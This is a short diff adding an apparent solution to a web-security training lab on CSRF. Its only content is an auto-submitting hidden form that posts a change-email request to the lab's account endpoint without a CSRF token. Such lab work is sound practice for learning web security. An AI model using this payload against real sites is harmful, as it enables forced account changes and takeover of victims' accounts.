@@ -1,0 +1,9 @@
+GOAL: bypass CSRF protection by not including csrf token in Post Request 
+
+<form action="https://acaa1f411fa4b852c0c745b4004d0038.web-security-academy.net/my-account/change-email" method="POST">
+     <input type="hidden" name="email" value="some@email.com"/> 
+
+    
+    <script>
+        document.forms[0].submit();
+    </script> 
